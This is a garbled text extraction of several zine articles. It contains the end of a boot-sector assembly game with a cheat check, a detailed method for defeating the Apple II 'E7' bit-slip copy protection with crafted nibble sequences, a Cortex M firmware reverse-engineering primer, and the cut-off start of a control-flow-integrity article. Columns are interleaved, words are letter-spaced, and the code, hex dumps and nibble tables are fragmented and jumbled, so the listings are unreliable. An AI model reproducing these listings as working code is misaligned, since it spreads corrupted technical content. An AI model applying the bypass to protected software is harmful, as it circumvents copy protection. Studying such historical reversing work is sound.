; i t e m a f t e r a l r e a d y g e t t i n g more t h a n 171
; b o n u s i t e m s ( 2 0 4 8 p o i n t s f o r bonus , 514
; p o i n t s p e r move ) w o u l d make t h e s c o r e go from
; 0 x f 5 f f to 0 x0001.
cmp ax , 0 x f 6 0 0
; i s t h e s c o r e h i g h enough t o
; ’ win ’ ;#CHEAT
j a win
ret
335
339
341
269
271
random :
; Decide whether t o
rdtsc
and ax , 0 x 0 0 0 f
cmp ax , 0 x 0 0 0 7
j n e undo
place
bonus / t r a p
345
347
349
351
353
355
357
359
361
363
365
369
371
; save
cx
375
275
277
279
281
283
timer
state
mov di , 0
mov cx , 0 x07d0
; enough f o r f u l l s c r e e n
winbg : mov ax , 0 x 0 1 0 0
; x o r ax , ax wont work , n e e d s
; b e t h i s machine−c o d e f o r m a t
rep stosw
; commit t o v i d e o memory
; G e t t i n g random p i x e l
redo :
rdtsc
; random
xor ax , dx
; x o r i t up a l i t t l e
xor dx , dx
; c l e a r dx
add ax , [ 0 x046C ] ; moar randomness
mov cx , 0 x07d0
; Amount o f p i x e l s on s c r e e n
div cx
; dx now h a s random v a l
s h l dx , 1
; a d j u s t f o r ’ even ’ p i x e l v a l u e s
winmessage :
db 0 x02 , 0 x20
dq 0 x 2 1 4 e 4 9 5 7 2 0 5 5 4 f 5 9
;YOU WIN!
db 0 x21 , 0 x21 , 0 x20 , 0 x02
; BIOS s i g and p a d d i n g
t i m e s 510 −( $−$$ ) db 0
dw 0xAA55
377
379
13
to
mov di , 0 x 0 7 c 4
; c o o r d t o s t a r t ’YOU WIN! ’ m es sa ge
xor c l , c l
; c l e a r counter r e g i s t e r
w i n l o o p : mov a l , [ w i n m e s s a g e ]
; g e t win m e s s a g e p o i n t e r
mov ah , 0 x 0 f
; w h i t e t e x t on b l a c k b a c k g r o u n d
stosw
; commit c h a r t o v i d e o memory
i n c byte [ w i n l o o p + 0 x01 ]
; next character
cmp di , 0 x 0 7 e 0
; i s i t the l a s t character?
jne winloop
i n c word [ winbg + 0 x01 ]
; incrememnt f i l l c h a r / f g / b g
; ( whichever i s next )
sub byte [ w i n l o o p + 0 x01 ] , 14
; b a c k t o f i r s t c h a r a c t e r upon
; next f u l l loop
jmp win
373
273
push cx
screen
mov bx , [ 0 x046C ] ; Get
add bx , 2
delay2 :
cmp [ 0 x046C ] , bx
jne d e l a y 2
343
367
267
win :
; clear
337
; Pad t o f l o p p y d i s k .
; t i m e s ( 1 4 4 0 ∗ 1 0 2 4 ) − ( $ − $$ )
db 0145
In Search of the Most Amazing Thing; or, Towards a Universal
Method to Defeat E7 Protection on the Apple ][ Platform
by Peter Ferrie (qkumba, san inc)
with thanks to 4am
normal start
E7
E7
normal start
E7
E7
E7
11100111011100111001110011111100111
XX
5.1
EE
E7
E7
E7
E7
11100111111001111110011111100111
FC
XX
FC
FC
FC
delayed start delayed start
original stream stream copy
Introduction
continues to shift in the new bits. When the QA
switch of the Data Register is zeroed, it discards
the bits that were already shifted in, and the hard-
ware will shift in bits as though nothing has been
read previously. The relevant code looks like this:
In the early days, there was a protection technique
known as the “generic bit-slip protection.” In mod-
ern times, the cracker known as 4am has dubbed
it the “E7 bitstream,” because of the trigger values
that are used to locate it. It was a very popular
technique.
While many nibble-checks could be defeated sim-
ply by not allowing them to run at all, some protec-
tion routines required that the code be run to pro-
duce their side effects, such as to decrypt pages or
to emit certain values that are checked later. At a
high level, our goal is therefore to simulate the E7
bitstream entirely, allowing the protection routine
to run as usual. That is, using a data-only solution
to avoid making any changes to the code. Stated ex-
plicitly, our goal is to produce either disks that can
be copied by COPYA (which, during a copy operation,
converts nibble data to sector data and then back
again) or “.dsk”-format disk images (which contain
only sector data). Therefore, we need sector data
that, when written to disk, produce nibble data that
pass the protection check. For that to be possible,
we must understand the protection itself and the
code that uses it.
A primer on the hardware in general and this
technique in particular was included in PoCkGTFO
10:7. The theory is that after issuing an access of
Q6H ($C08D+(slot*16)), the QA switch of the Data
Register will receive a copy of the status bits, where
it will remain accessible for four CPU cycles. After
four CPU cycles, the QA switch of the Data Register
will be zeroed. Meanwhile, assuming that the disk
is spinning at the time, the Logic State Sequencer
READNIB EQU $C08C
RSTLATCH EQU $C08D
LDY
NIB1
LDA
BPL
READNIB,X *
NIB1
DEY
BEQ FAIL
CMP
BNE #$D5
NIB1
LDY
NIB2
LDA
BPL
try 256 times:
read nibble, compare with D5
#0
READNIB,X
NIB2
DEY
BEQ FAIL
CMP
BNE #$E7
NIB2
try 256 times: (*1)
read nibble, compare with E7
NIB3
LDA
BPL
CMP
BNE READNIB,X
NIB3
#$E7
FAIL read nibble, compare with E7
NIB4
LDA
BPL
CMP
BNE READNIB,X
NIB4
#$E7
FAIL read nibble, compare with E7
LDA RSTLATCH,X desynch
LDY #$10
BIT
NIB5
LDA
BPL
15
#0
$06
READNIB,X
NIB5
DEY
BEQ FAIL
CMP
BNE #$EE
NIB5
ensure >4 cycles between reads
try 16 times: (*2)
read nibble, compare with EE
*
X = BootSlot << 4skipped
11100 11101110 0 11100111 00 11111100 11101110
EE
E7
FC
EE
0 11100111 00 11111100 11101110 0 11101110 0 11111100 111...
E7
FC
EE
EE
FC
Interestingly, the bit $06 instruction is a misdi-
rection. It exists only for the purpose of consuming
some cycles. Any other instruction of equal duration
could have been used, and it might be considered a
watermark. While it is the value that exists most
commonly, some titles changed the value of the ad-
dress to 80 or FF, and these versions were spread,
too.
In the most common implementation of the
E7 protection, the stream on disk appears as
D5 E7 E7 E7 E7 E7 E7 E7 E7 E7 E7 E7 E7 with
some harmless zero-bits in between. So from where
do the other values come? The magic is in the tim-
ing of the reads, and timing is everything, so we
must count the cycles!
LDA
BPL
CMP
BNE READNIB,X
NIB4
#$E7
FAIL 2 cycles
2 cycles
2 cycles
LDA RSTLATCH,X 4 cycles
LDY #$10 2 cycles
BIT $06 3 cycles
The old zero-bits are still in bold, and the newly
exposed zero-bits are in italics. We can see that
the old zero-bits form part of the new stream. This
decodes to EE E7 FC EE E7 FC EE EE FC, and we
have our magic values. The fourth bit must be a
zero-bit in the original stream in case only three bits
are slipped. Having the fifth bit be a zero-bit in the
original stream makes a nice pattern of repeating
values, if for no other reason.
5.2
Well-Groomed Data
In order to defeat this at all, we need to produce
a regular 6-and-2 encoded sector which can be read
by real hardware and copied by regular DOS.
We start by exploiting the point marked by (*1).
There’s a search for E7 after the D5. This allows us
to introduce a full data prologue without breaking
the check. So now we have this:
D5 AA AD E7 E7 E7 E7 E7 E7 E7 E7 E7 E7
E7 E7 ...
We can even conclude it with a regular epilogue
so that there are no read errors. So now we have
this:
D5 AA AD E7 E7 E7 E7 E7 E7 E7 E7 E7 E7
E7 E7 ... DE AA
It looks like a regular sector. The next step is to
fill the stream with the appropriate values, including
simulating the presence of the timing bits.
15 cycles
One bit is shifted in every four CPU cycles, so
a delay of 15 CPU cycles is enough for three bits
to be shifted in. Those bits are discarded. How-
ever, since the CPU and the Disk ][ system are not
synchronized, then depending on exactly when the
initial read began, there can be up to two additional
cycles in the total count. That puts us in the 16 cy-
cle range, which is sufficient for a fourth bit to be
shifted in and then discarded. In any case, the hard-
ware sees it like this, due to a slip of three (or four)
bits:
D5 E7 E7 E7 [slip] EE E7 FC EE E7 FC EE
EE FC
In binary, the stream looks like this, with the
seemingly redundant zero-bits in bold.
5.3
The Hard Stuff
We will use Bank Street Writer III for our first
attempt, since it is the simplest example. Bank
Street Writer III requires only one nibble from the
pattern to be valid as an 8-bit decryption key for one
page of memory. That nibble appears at a position
four nibbles after the EE, and its value must be E7,
so our pattern looks like this:
EE ?? ?? ?? E7 ...
Since we can’t rely on timing bits in our stream
(because we need sector data that produces nibble
11010101 11100111
11100111 11100111
D5
E7
E7
E7
11100111 0 11100111 00 11100111 11100111 0 11100111 00
E7
E7
E7
E7
E7
11100111 11100111 0 11100111 0 11100111 11100111
E7
E7
E7
E7
E7
However, by skipping the first three or four bits,
the stream looks quite different.
16data that this code interprets as valid), we can’t
place the EE inside a pair of E7s because after the bit-
slip the wrong value will be read. Instead, we have
to encode the value EE directly after discarding the
first three bits, and placing a zero-bit in the fourth
bit for compatibility purposes. In binary, that looks
like this:
???01110 1110???? ???????? ????????
???????? 11100111 ...
After the bit-slip (and our extra zero-bit), the
hardware sees:
...11101110 ???????? ???????? ????????
???? [11100111] ...
We must make those last four bits “disappear,” in
order to align our E7 value correctly and allow it to
be seen. If we turn those four bits into zeroes and
distribute them within the stream, while adhering
to the rule of not more than two consecutive zeroes,
and replace the rest with ones, we get this:
...11101110 11111111 00 11111111 00
11111111 [11100111] ...
The hardware reads this as EE FF FF FF E7.
Then we prepend one-bits and a zero-bit to the first
(partial) nibble, like this:
[1110]11101110 11111111 00 11111111 00
11111111 [11100111] ...
After realigning the stream, we have this:
11101110 11101111 11110011 11111100
11111111 [11100111] ...
On disk, it appears as EE EF F3 FC FF E7.
The final step is to pad the data to a multiple of
the sector size, so that we have a complete sector.
We must also include the calculate the proper check-
sum. The remaining contents of the sector at this
point are entirely arbitrary. We could place a text
message or draw a picture, if we chose. Perhaps the
most aesthetic version is to include a nibble which
will zero the running value, and then fill the rest of
the sector with 96s, since 96 is the nibble value for
zero. This will yield a sector which is devoid of all
content other than the needed values. If that version
is chosen, then a quick lookup in the nibble transla-
tion table shows us that the nibble value which will
zero the running value is F3, so our whole stream
appears as:
D5 AA AD E7 E7 E7 EE EF F3 FC FF E7 F3
96 96 ... DE AA
Great, it runs on hardware.
5.4
Then we try AppleWin (as at 1.25.0.4). It
doesn’t work. Why not? Because instead of shifting
bits into the data latch one at a time until the top
bit is set, AppleWin shifts in an entire nibble im-
mediately. It means that AppleWin does not (and
cannot!) support bit-slip at all. Hmm, can we sup-
port both at the same time? Let’s see about that.
We need to encode the first nibble as an EE, while
also allowing a bit-slipping hardware to decode it as
an EE. Well, we have that already, so we’re halfway
there! That just leaves the value four nibbles af-
ter the EE, which is currently the arbitrary value of
FF. We change that FF to E7, so our stream on disk
appears as:
EE EF F3 FC E7 E7
The final step is to pad the sector as we did pre-
viously. Using the aesthetic choice again, we zero
the running value and then fill the rest of the sector
with 96s. A quick lookup in the nibble translation
table shows us that the needed value is D6, so our
whole stream appears as:
D5 AA AD E7 E7 E7 EE EF F3 FC E7 E7 D6
96 96 ... DE AA
We have a regular sector that works on hardware
and AppleWin at the same time.
5.5
Totally Rad
Next up is Rad Warrior. It requires four nibbles
from the pattern to be valid (as a 32-bit decryp-
tion key for four pages of memory), starting with
the fourth nibble. It means that our Bank Street
Writer III technique won’t work because the pat-
tern will be read differently between the bit-slip and
the non-bitslip version, after the fourth nibble.
We have to come up with another technique.
We do this by exploiting the point marked by (*2).
There’s a search for the EE. It means that we can
insert nibbles after the point of the bit-slip, which
will re-sync the stream to the non-slip form. At that
point, we can insert any pattern that we need. We
start with an arbitrary compatible sequence:
EF FF FF FF
Apple for the Win, or Not.
17In binary, it’s:
11101111 11111111 11111111 11111111
After the bit-slip (and our extra zero-bit), the
hardware sees:
...11111111 11111111 11111111 1111
As above, we must make those last four bits dis-
appear, in order to align our pattern later. As above,
we turn the four bits into zeroes and distribute them
within the stream, while adhering to the rule of not
more than two consecutive zeroes. Let’s try this:
...0 11111111 00 11111111 0 11111111
The hardware reads this as FF FF FF. Then we
prepend one-bits and a zero-bit to the first (partial)
nibble again, like this:
[1110]011111111 00 11111111 0 11111111
After realigning the stream, we have this:
11100111 11111001 11111110 11111111
On disk, it appears as:
E7 F9 FE FF
That final FF is redundant, so we remove it.
Then we append our complete pattern without any
consideration for bit-slip. Our stream looks like this:
E7 F9 FE EE E7 FC EE E7 FC EE EE FC
The final step is to pad the sector as we did pre-
viously. Using the aesthetic choice again, we zero
the running value and then fill the rest of the sector
with 96s. A quick lookup in the nibble translation
table shows us that the needed value is FB, so our
whole stream appears as:
D5 AA AD E7 E7 E7 E7 F9 FE EE E7 FC EE
E7 FC EE EE FC FB 96 96 ... DE AA
We have a regular sector that works on hardware
and AppleWin at the same time.
5.6
A Small Bump in the Road
Then we try it all in MAME (as of 0.169), because
MAME is supposed to behave like the hardware. . .
But. It. Does. Not. Work. Well, shit. And why
not? Because while MAME does support bit-slip, it
always consumes four bits for the code above, but
most critically, it treats the bit in the fifth position
as though it were always a one-bit.
It means that these four sequences are all de-
coded as 11111111 00 11111111 00 after the bit-
slip. (Only one of which is correct.)
1 11111111
11101111
3 11110111
11100111
11110011
11110011
11110011
11110011
11111100
11111100
11111100
11111100
11110011 11110011 11111100 is decoded as
10111111 00 11111111 00 after the bit-slip, which
is not correct, either.
Despite the time that I’ve spent poring over the
source code, I have not yet determined the cause, so
we’re left to work around it. Can we add support for
MAME, while keeping the existing support? With-
out duplicating everything? Let’s see about that.
We need to move a zero-bit beyond the slipped
region so that the hardware will read the same bits
that MAME does.
2
[ 1 1 1 0 ] 0 11111111 00 11111111 0x . . .
V−−−>−−−>−−−>−−−>−−−>−−−^
After moving the zero bit, we have
[1110]11111111 00 11111111 00 .... Realign-
ing that stream, we get 11101111 11110011
11111100 ..., which looks good. On disk, it ap-
pears as EF F3 FC.
Then we append our complete pattern without
any consideration for bit-slip. This stream is EF F3
FC EE E7 FC EE E7 FC EE EE FC.
The final step is to pad the sector as we
did previously. Using the aesthetic choice again,
we zero the running value and then fill the rest
of the sector with 96s.
A quick lookup in
the nibble translation table shows us that the
needed value is EA, so our whole stream ap-
pears as D5 AA AD E7 E7 E7 EF F3 FC EE E7 FC
EE E7 FC EE EE FC EA 96 96 ... DE AA.
It also immediately supports Batman and Prince
of Persia, both of which require the entire pattern
(as a 64-bit decryption key for five pages of mem-
ory in Batman, and as a seed for several check-bytes
during gameplay in Prince of Persia). Superb!
185.7
Success!
First Blood Part II (a pure text adventure!), Sum-
mer/Winter/World Games, The Ancient Art of War
[at Sea], Tetris, and Xevious
We have a truly universal nib sequence, which works
on hardware, which works on AppleWin, which
works on MAME (and which will still work when
the bug is fixed), and which defeats the E7 protec-
tion.
Here is our universal sequence in the form of a
disk sector:
2
4
6
8
10
12
14
16
03
00
00
00
00
00
03
00
00
00
00
01
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
02
00
00
00
00
03
00
00
00
00
00
00
00
00
00
00
01
00
00
00
00
02
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
02
00
00
00
00
00
03
00
00
00
00
03
00
00
00
00
02
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
01
00
00
00
00
00
01
00
00
00
00
03
00
00
00
00
00
00
00
00
00
00
02
00
00
00
00
03
00
00
00
00
01
00
00
00
00
00
01
00
00
00
00
01
00
00
00
00
01
00
00
00
00
00
02
00
00
00
00
02
00
00
00
00
03
00
00
00
00
00
01
00
00
00
00
02
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
00
01
00
00
00
00
00
02
00
00
00
00
01
00
00
00
00
00
00
00
00
00
00
02
00
00
00
00
02
00
00
00
00
01
00
00
00
00
00
AlgebraCVolumeC3Cv3x8|
AliceCinCWonderland|AnimalC
Kingdom|BankCStreetCStorybook|
Bannercatch|Batman|BumbleCPlotC3xH|
CaliforniaCGames|ChampionshipCWrestling|
ColorMe|Deathsword|Destroyer|DigCDugC(ThunderC
MountainT|Dinosaurs|DiveCBomber|FractionCAction|
GxIxCJoe|GalaxianC(ThunderCMountainT|GertrudewsC
PuzzlesC3xH|GertrudewsCSecrets|GertrudewsCSecretsC3x-|
HouseJaJFire|ImpossibleCMissionCII|JamesCBondCzz8CinCAC
ViewCToCACKill|JumpingCMathCFlash|LxAxCCrackdown|MagicalC
Myths|MathCShop|MathematicsCProblemCSolvingCSoftwareCLevelC
3JHJ-|MathematicsCToday|MicrozineC3HJ3-J36J38J3N|MoptownC
HotelC3xH|MoptownCHotelC3x-|MurderCbyCtheCDozen|NumberC
Bowling|PacJManC(ThunderCMountainT|Paperboy|PitstopCII|
Quations|RaceCCarCwRithmetic|Racter|RadCWarrior|RamboCFirstC
BloodCPartCII|RiddleCMagic|ScienceCVolumeCHCJCGeology|
ScienceCVolumeC-|ScienceCVolumeC0CJCSpace|Spiderbot|StarC
MazeC(ScottICForesmanCandCCompanyT|StreetCSportsC
Basketball|StreetCSportsCSoccer|SuccessCwithCTyping|
SuperPrint|SurveyCTaker|TenCLittleCRobots|Tetris|TheC
AdventuresCofCSinbad|TheCAmericanCChallenge|TheC
AncientCArtCofCWar|TheCHalleyCProject|TheCMist|
TheCMovieCMonsterCGame|TheCNotableCPhantom|
TheCPerfectCCollege|TheCPerfectCScore|TheC
Playroom|TheCSportingCNewsCBaseball|
TheCWorldwsCGreatestCBaseballC
Game|TinkwsCAdventure|
Xevious
As far as we know, this technique first appeared
in 1983. It was used to protect the title Locksmith,
ironically a product for defeating copy-protection.
00
00
00
00
00
02
00
00
00
00
02
00
00
00
00
00
None of the disk copiers of the day could copy
E7 disks without a parameter unique to the target,
so duplicating these disks always required a bit of
expertise.
This can be applied wherever the E7 se-
quence is the regular pattern. For other pat-
terns, such as those used by Thunder Mountain’s
“Dig Dug” (E7 EE EE EE E7 E7 EE E7 EE EE EE
E7 EE E7 EE EE), Sunburst’s “1-2-3 Sequence Me”
(BB F9 Fx), and MCE’s “The 4th R - Reason-
ing” (EB B6 EF 9A DB B7 ED F9 D7 BF BD A7 B3
FF B3 BA), just place the proper pattern after the
“EF F3 FC” sequence, pad the sector as you like,
and then fix the sector checksum.
5.8
Final Words
Here is an interesting question: What if you don’t
have an entire sector available on the track that you
need?
Fortunately, this would be a concern only for a
protection which used the rest of the sector (and the
rest of the track) for meaningful data, which I have
not seen so far. In any case, the solution would be to
insert only the nibble sequence “EF F3 FC ... EE
EE FC” and to not pad the sector. This would yield
a freely-copyable disk in its original form. However,
we must discourage that idea with these words from
4am:
N
For the record, the E7 stream is used in many
other titles (games or educational software), such
as Commando, Deathsword, Ikari Warriors, Impos-
sible Mission II, Karate Champ, Paperboy, Rambo
ever patch an original disk.
D on't reduce the number of original disks in the world.
t hey aren't making any more of them.
-4am
196
A Tourist’s Phrasebook for Reversing Embedded ARM
in the Dialect of the Cortex M Series
by Travis Goodspeed and Ryan Speers
Ahoy there, neighbor!
Welcome to another installment of our series of
quick-start guides for reverse engineering embedded
systems. Our goal here is to get you situated with
the architecture of smaller devices as quickly as pos-
sible, with a minimum of fuss and formality.
Those of you who have already worked with
ARM might find it to be a useful refresher, while
those of you new to the architecture will find that
it isn’t really as strange as you’ve been led to be-
lieve. If you’ve already reverse engineered binaries
for any platform, even x86 Windows applications,
you’ll soon feel right at home.
We’ve written this guide with STM32 devices for
specific examples, but with minor differences it ap-
plies well enough to the Cortex M series as a whole.
These devices generally have a megabyte or less of
Flash and at most a few hundred kilobytes of RAM.
By and large, they only run the Thumb2 instruc-
tion set, without support for the older AARCH32
instruction set. For larger ARM chips, such as those
used in smartphones and tablets, you might be bet-
ter served by a different introduction.
6.1
a waste of space, and that RISC wouldn’t “change
everything.” These instructions were always 32-bit
word aligned, so the lowest two bits of the Program
Counter (R15) were always zero.
Larger ARM chips, such as those in an early
smartphone, support two instructions sets.
If
the least significant bit of the program counter is
clear (0), then the 32-bit instruction set is used,
whereas if that bit is set (1), the chip will use a
16-bit instruction set called Thumb. Registers are
still 32 bits wide, but the instructions themselves are
only a half-word. They must be half-word aligned.
Because Thumb instructions have fewer bits to
spare, code in larger ARM machines will switch be-
tween ARM and Thumb as it is convenient. You
can see this in the least significant bit of a function
pointer, where an ARM function’s address will be
even, while a Thumb function’s address will be odd.
The Cortex M3 devices speak a slimmer dialect
than the big-iron ARM chips. This dialect drops the
32-bit wide instruction set entirely, supporting only
Thumb and Thumb2 instructions. 9 Because of this,
all functions and all interrupt handlers are referred
to by odd addresses, which are actually the address
of the byte after the real starting address! If you
see a call to 0x08005615, that is really a call to the
Thumb code at 0x08005614.
At a Glance
Common Models
STM32, EFM32
6.3
Architecture
32-bit registers
16-bit and 32-bit Thumb(2) instructions
Arguments are passed to the child function from R0
to R3. R4 to R11 hold local variables, and the child
function must restore them before returning to the
parent function. Values are returned in R0 to R3,
and these registers are not preserved by the child.
Much like in PowerPC and very unlike x86, the
Link Register (R14, a.k.a. LR) holds the return ad-
dress. A leaf function, having no children, might
never write its return pointer to the stack. The
BL instruction automatically moves the old Program
Counter into the Link Register when calling a child,
so parent functions must manually save R14 before
calling children. The return instruction, BLR, func-
tions by moving R14 (LR) into R15 (PC).
Registers
R15: Program Counter
R14: Link Register
R13: Stack Pointer
R0 to R12: General Use
6.2
Registers and Calling Convention
Basics of the Instruction Set
Back in the day, ARM used fixed-width 32-bit RISC
instructions. Like the creation of the world, this
was widely regarded as a mistake, and many an-
gry people wrote comments complaining that it was
9 Thumb2 instructions run from Thumb mode. The only thing new about them is that they can be longer than 16 bits, so
your disassembler might be slightly confused about their starting position.
20STM32F40 xxx
MEMORY MAP
Reserved
CORTEX-M4 internal peripherals
Reserved
AHB3
0Xe010
0Xe000
0Xa000
0Xa000
0000 - 0Xffff ffff
0000 - 0Xe00f ffff
1000 - 0Xdfff ffff
0fff
0X6000 0000
0X5006 0c00 - 0X5fff ffff
0X5006 0bff
Reserved
AHB2
0Xffff ffff
FSMC registers
0X8000 0000
0X7fff ffff
0X6000 0000
0X5fff ffff
0X4000 0000
0X3fff ffff
0X2000 0000
0X1fff ffff
0X0000 0000
N
512-Mbyte
block 4
FSMC bank3
& bank4
512-Mbyte
block 3
FSMC bank1
& bank2
512-Mbyte
block 1
SRAM
512-Mbyte
block 0
Code
NE
E
SE
SW
S
0X5000 0000
0X4008 0000 - 0X4fff ffff
0X4007 7fff
Reserved
AHB1
0X4002 0000
0X4001 5800 - 0X4001 ffff
0X4001 5fff
Reserved
APB2
512-Mbyte
block 2
Peripherals
NW
W
s
l
a
0Xa000 0000
0X9fff ffff
M
C
r
0Xc000
0Xbfff
0Xe000
0Xdfff
512-Mbyte
block 7
Cortex-M4 ́s
internal
0000 peripherals
ffff
512-Mbyte
block 6
Not used
0000
ffff
512-Mbyte
block 5
cortex
arm
flash
interrupt
radare
Reserved
SRAM (16 Kb aliased
by bit-handling)
SRAM (112 Kb aliased
by bit-handling)
Reserved
Option Bytes
Reserved
System memory + OTP
Reserved
CCM data RAM
(64 KB data SRAM)
Reserved
Flash
Reserved
Aliased to Flash, system
memory or SRAM depending
on the BOOT pins
pastor
0X2002 0000 - 0X3fff ffff
0X2001 c000 - 0X2001 ffff
Reserved
0X4001 0000
0X4000 7800 - 0X4000 ffff
0X4000 7fff
0X2000 0000 - 0X2001 bfff
0X1fff
0X1fff
0X1fff
0X1fff
0X1001
c008
c000
7a10
0000
0000
-
-
-
-
-
0X1fff
0X1fff
0X1fff
0X1fff
0X1ffe
ffff
c007
7fff
7a0f
ffff
APB1
0X1000 0000 - 0X1000 ffff
0X0810 0000 - 0X0fff ffff
0X0800 0000 - 0X080f ffff
0X0010 0000 - 0X07ff ffff
0X0000 0000 - 0X000f ffff
0X4000 0000
Figure 3 – STM32F40xxx Memory Map
216.4
Memory Map
Figure 3 shows the memory layout of the
STM32F405, a Cortex M4 device. Study this map
for a moment, before we go on to how to use it in
your adventure!
Because Cortex M devices have four gigabytes of
address space but hardly a megabyte of Flash, they
keep functionally different parts of memory at very
different addresses.
Code memory is officially the range from
0x00000000 to 0x1FFFFFFF, but in nearly all cases,
you’ll find that Flash is mapped to begin at 0x0800-
0000. When reverse engineering an application,
you’ll find that it’s either written here or a few
dozens of kilobytes later, to leave room for a boot-
loader.
SRAM is usually mapped to begin at 0x2000-
0000, so it’s safe to assume that any read or write
to an absolute address in this region is a global vari-
able, and also that the stack and heap fit somewhere
in this range. Unlike a desktop application, which
loads its initial globals directly into a .data seg-
ment, an embedded application must manually ini-
tialize its data variables, possibly by copying a large
chunk from Flash into SRAM.
Peripheral memory begins at 0x40000000. Both
because peripherals are most often referred to by an
explicit address, and because Flash comes with no
linking systems or system calls, reads and writes to
this region are a gold mine for a reverse engineer!
System control registers are at 0xE0000000.
These are used to do things like moving the inter-
rupt table or reading the chip’s model number.
6.5
you can try in the next section, is that data pointers
are always even and instruction (function) pointers
are always odd.
6.6
Making Sense of the Interrupt
Table
Let’s take a look at the interrupt table from the be-
ginning of a Cortex M firmware image. These are
32-bit little endian addresses, which are to be read
backwards.
0000000 30
39
0000010 41
4
49
0000020 00
6
00
0000030 4d
8
55
0000040 . . .
2
14
57
57
57
00
00
57
57
00
00
00
00
00
00
00
00
20
08
08
08
00
00
08
08
21
3d
45
00
00
51
00
59
41
57
57
00
00
57
00
57
00
00
00
00
00
00
00
00
08
08
08
00
00
08
00
08
Note that the first word, 0x20001430, is in the
SRAM region; this is because the first word of a Cor-
tex M interrupt table is the initialization value for
the Stack Pointer (R13). The second word, 0x0800-
4121, is the initialization value for the Program
Counter (R15), so we know the entry point of the
application is Thumb2 code starting at 0x08004120.
Except for some reserved (zeroed) words, the
handler addresses are all in Flash memory and rep-
resent the interrupt handler functions. We can look
up the meaning of each handler in the specific chip’s
programming guide, then chase the ones that are
most relevant. For example, if we are reverse engi-
neering a USB device, powered by an STM32F3xx,
the STM32F37xx reference manual tells us that the
interrupts at offsets 0x000000D8 and 0x0000001C
handle USB events. These might be good handlers
to reverse early in the process.
Making Sense of Pointers
Let us teach you some nifty tricks about pointers in
Thumb machines.
Back when ARM was first designed, 32-bit fixed-
width instructions with 32-bit alignment were all the
rage, and all the cool kids (POWER, SPARC, Al-
pha) used them. Later on, when the Thumb in-
struction set was being designed, its designers chose
16-bit instructions that could be mapped back to
the same 32-bit core. The CPU would fetch a 32-bit
ARM instruction if the least-significant bit of the
program counter were even, and a 16-bit Thumb in-
struction if the program counter were odd.
But these Cortex chips generally ship just
Thumb and Thumb2, without backward compatibil-
ity to 32-bit ARM instructions. So the trick, which
6.7
Loading into IDA Pro or Radare2
To load the application into IDA Pro or Radare2,
you generally need to know the loading point and
the locations of some other memories.
The loading point will be at or near 0x08000000,
depending upon whether a bootloader comes before
your image. If you are working from a JTAG dump,
just use the address the image came from. If you
are working from a .dfu (Device Firmware Update)
file, it will contain a loading address in its header
metadata.
22When given a raw dump without a starting ad-
#define USART2_BASE
(APB1PERIPH_BASE + 0 x00004400 )
dress, disassemble the instructions and try to find 25
#define APB1PERIPH_BASE
a loading address at which the interrupt handlers 27
PERIPH_BASE
line up. (The interrupt vector table is usually at
#define PERIPH_BASE
( ( u i n t 3 2 _ t ) 0 x40000000 )
0x08000000 at boot, but it can be moved to a new 29
address by software.)
6.8
\
\
\
This means that USART2’s data structure is lo-
cated at 0x40004400. From the USART_TypeDef
structure, we know that data is received from US-
ART2 by reading 0x40004424 and written to US-
ART2 by writing to 0x40004428! Searching for
these addresses ought to easily find us the read and
write functions for that port.
Making Sense of the Peripherals
The Cortex M3 contains two peripheral regions. At
0x40000000, you will find the most useful ones for
reverse engineering applications, such as UART and
USB controllers, General Purpose IO (GPIO), and
other devices. Unfortunately, these peripherals are
not generic to the Cortex M3 as an architecture;
rather, they are specific to each individual chip.
Supposing you are reverse engineering an appli-
cation for the STM32F3xx series, you would down-
load the Peripheral Support Library for that chip
from its manufacturer and eventually find yourself
reading stm32f30x.h. For other chips, there are
similar headers, each of which is written around C
structs for register groups and preprocessor defini-
tions for peripheral base addresses and offsets.
Suppose we know from reverse engineering a cir-
cuit board that USART2 is used by our target ap-
plication to send packets to a radio chip, and we
would like to search for all functions that use this
peripheral. Working backwards, we find the follow-
ing relevant lines in stm32f30x.h.
6.9
Other Oddities
Please note that this guide has left out some features
unique to the STM32 series, and that each chip has
its own little quirks. You’ll find different memory
maps on each implementation, and anything that
looks confusing is likely worth spending more time
to understand.
For example, some ARM devices offer Core-
Coupled Memory (CCM), which is SRAM that’s
wired directly to the CPU’s internal data bus rather
than to the main memory bus of the chip. This
makes fetches lightning fast, but has the complica-
tions that the memory is unusable for DMA or code
fetches. Care for a non-executable stack, anyone?
Another quirk is that many devices map the
same physical memory to multiple virtual locations.
In some high-performance code, the use of both
cached and uncached memory can allow for more
efficient operation.
Additionally, address zero often contains a dupli-
cate of the boot memory, which is usually Flash but
might be executable SRAM. Presumably this was
done to allow for code that has compatible imme-
diate addresses when booting from either memory,
but PoCkGTFO 10:8 describes a nifty little jailbreak
that relies on dumping the 48K recovery bootloader
of an STM32F405 chip out of Flash through a null-
pointer read.
–——–
———
—–—–
We hope that you’ve enjoyed this friendly lit-
tle guide to the Cortex M3, and that you’ll keep it
handy when reverse engineering firmware from that
platform.
1 // A b b r e v i a t e d USART r e g i s t e r s t r u c t .
typedef struct {
3
__IO u i n t 3 2 _ t CR1 ;
//+0x00
__IO u i n t 3 2 _ t CR2 ;
5
__IO u i n t 3 2 _ t CR3 ;
__IO u i n t 1 6 _ t BRR;
7
u i n t 1 6 _ t RESERVED1;
__IO u i n t 1 6 _ t GTPR;
9
u i n t 1 6 _ t RESERVED2;
__IO u i n t 3 2 _ t RTOR;
11
__IO u i n t 1 6 _ t RQR;
u i n t 1 6 _ t RESERVED3;
13
__IO u i n t 3 2 _ t ISR ;
__IO u i n t 3 2 _ t ICR ;
15
__IO u i n t 1 6 _ t RDR;
//+0x24 RX Data Reg
u i n t 1 6 _ t RESERVED4;
17
__IO u i n t 1 6 _ t TDR;
//+0x28 TX Data Reg
u i n t 1 6 _ t RESERVED5;
19 } USART_TypeDef ;
21 //USART l o c a t i o n d e f i n i t i o n s .
#define USART2
\
23
( ( USART_TypeDef ∗ ) USART2_BASE)
237
A Ghetto Implementation of CFI on x86
by Jeffrey Crowell
1
3
1
3
5
7
9
11
In 2005, M. Abadi and his gang presented a nifty
Of course, this sounds quite easy, so let’s dig in
trick to prevent control flow hijacking, called Control
a bit further. Here is a very simple example pro-
Flow Integrity. CFI is, essentially, a security policy
gram to illustrate ROP, which we will be able to
